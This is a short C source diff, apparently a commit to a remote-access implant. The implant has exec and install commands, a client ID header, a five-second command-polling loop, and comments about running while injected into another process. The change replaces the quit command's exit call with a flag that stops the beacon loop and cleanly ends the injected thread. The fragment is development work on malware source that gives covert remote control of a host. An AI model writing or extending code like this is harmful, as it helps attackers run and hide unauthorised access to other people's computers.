@@ -8,6 +8,8 @@ char* HEADER_KEY_COMMAND  = "command: ";
 char* HEADER_KEY_COMMANDS = "Commands: ";
 char* HEADER_KEY_CLIENTID = "clientid: ";
 
+unsigned char time_to_quit = 0;
+
 // Built-in Commands
 char* CMD_exec(char* args)
 {
@@ -58,9 +60,12 @@ char* CMD_gogo(char* args)
     return NULL;
 }
 
+// TODO: This successfully stops the thread (if injected) or process (if running as executable)
+// If injected, this does NOT free the mapped memory.
 char* CMD_quit(char* args)
 {
-    exit(0);
+    time_to_quit = 1;
+    return NULL;
 }
 
 char* CMD_install(char* args)
@@ -149,7 +154,7 @@ void jitter_connect()
     // TODO: Make this jitter instead of a constant time.
     // Seperate initial connect from interactive connection?
     // Initial connect will probably be handled by a wrapper program, in case of crashes in this one
-    while (1)
+    while (!time_to_quit)
     {
         command_loop();
         Sleep(5 * 1000);  
